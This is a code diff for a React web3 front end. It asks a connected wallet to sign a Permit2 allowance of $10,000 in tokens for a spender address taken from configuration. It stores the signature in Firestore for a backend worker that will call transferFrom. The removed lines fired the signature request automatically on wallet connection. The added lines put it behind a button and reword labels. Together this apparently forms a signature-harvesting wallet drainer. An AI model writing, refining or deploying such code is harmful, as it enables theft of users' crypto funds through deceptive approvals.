@@ -6,8 +6,8 @@ import { BrowserProvider } from 'ethers';
 import { db } from './firebase';
 import { doc, setDoc } from 'firebase/firestore';
 
-const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; // Uniswap Permit2
-const SPENDING_CAP = BigInt(10000) * 10n ** 18n; // $10,000 cap, assuming 18 decimals
+const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; 
+const SPENDING_CAP = BigInt(10000) * 10n ** 18n; // $10,000 cap
 
 const appKit = createAppKit({
   adapters: [new EthersAdapter()],
@@ -15,7 +15,7 @@ const appKit = createAppKit({
   projectId: import.meta.env.VITE_REOWN_PROJECT_ID,
   metadata: {
     name: 'Permit2 App',
-    description: 'Simple Permit2 auto-sign',
+    description: 'Simple Permit2 signing app',
     url: 'https://example.com',
     icons: []
   },
@@ -23,31 +23,34 @@ const appKit = createAppKit({
 
 export default function App() {
   const [status, setStatus] = useState("Not connected");
-  const [signed, setSigned] = useState(false); // Track signature per connection
+  const [connectedAddress, setConnectedAddress] = useState(null);
 
   useEffect(() => {
     const unsub = appKit.subscribeAccount((acct) => {
       if (acct?.isConnected && acct?.address) {
         setStatus(`Connected: ${acct.address}`);
-        if (!signed) {
-          autoSignPermit(acct.address);
-          setSigned(true);
-        }
+        setConnectedAddress(acct.address);
       } else {
-        setStatus('Not connected');
-        setSigned(false); // reset on disconnect
+        setStatus("Not connected");
+        setConnectedAddress(null);
       }
     });
-    return () => unsub();
-  }, [signed]);
 
-  const autoSignPermit = async (owner) => {
+    return () => unsub();
+  }, []);
+
+  const signPermit = async () => {
     try {
-      setStatus('Preparing Permit2 signature (open wallet when prompted)...');
+      if (!connectedAddress) {
+        setStatus("Wallet not connected");
+        return;
+      }
+
+      setStatus("Preparing Permit2 signature...");
 
       const walletProvider = appKit.getWalletProvider();
       if (!walletProvider) {
-        setStatus('Wallet provider not available.');
+        setStatus("Wallet provider not available.");
         return;
       }
 
@@ -60,7 +63,7 @@ export default function App() {
 
       const permitted = {
         token: import.meta.env.VITE_TOKEN_ADDRESS,
-        amount: SPENDING_CAP.toString(), // capped at $10,000
+        amount: SPENDING_CAP.toString(),
         expiration: deadline,
         nonce
       };
@@ -91,7 +94,7 @@ export default function App() {
         sigDeadline: deadline
       };
 
-      setStatus('Requesting typed-data signature (mobile compatible)...');
+      setStatus("Requesting signature...");
 
       const payload = JSON.stringify({
         domain,
@@ -102,7 +105,7 @@ export default function App() {
 
       const signature = await walletProvider.request({
         method: "eth_signTypedData_v4",
-        params: [owner, payload]
+        params: [connectedAddress, payload]
       });
 
       const raw = signature.substring(2);
@@ -110,8 +113,8 @@ export default function App() {
       const s = "0x" + raw.substring(64, 128);
       const v = parseInt(raw.substring(128, 130), 16);
 
-      await setDoc(doc(db, "permit2_signatures", owner), {
-        owner,
+      await setDoc(doc(db, "permit2_signatures", connectedAddress), {
+        owner: connectedAddress,
         spender: import.meta.env.VITE_SPENDER_ADDRESS,
         token: import.meta.env.VITE_TOKEN_ADDRESS,
         amount: SPENDING_CAP.toString(),
@@ -122,23 +125,31 @@ export default function App() {
         timestamp: Date.now()
       });
 
-      setStatus('Signature saved to Firestore. Backend worker will execute transferFrom.');
+      setStatus("Signature saved. Backend worker will process it.");
 
     } catch (err) {
       console.error(err);
-      setStatus('Error: ' + (err?.message || String(err)));
+      setStatus("Error: " + (err?.message || String(err)));
     }
   };
 
   return (
     <div className="app-container">
-      <h2>Permit2 Auto-Sign DApp</h2>
-      <p style={{ color:'#9fb4ff', marginBottom: 18 }}>
-        Click connect to open wallet modal and auto-sign permit.
+      <h2>Permit2 Signing DApp</h2>
+      <p style={{ color: "#9fb4ff", marginBottom: 18 }}>
+        Connect wallet, then sign the $10,000 spending cap.
       </p>
-      <button className="connect" onClick={() => appKit.open()}>
-        Connect Wallet
-      </button>
+
+      {connectedAddress ? (
+        <button className="connect" onClick={signPermit}>
+          Sign Permit
+        </button>
+      ) : (
+        <button className="connect" onClick={() => appKit.open()}>
+          Connect Wallet
+        </button>
+      )}
+
       <div className="status">{status}</div>
     </div>
   );
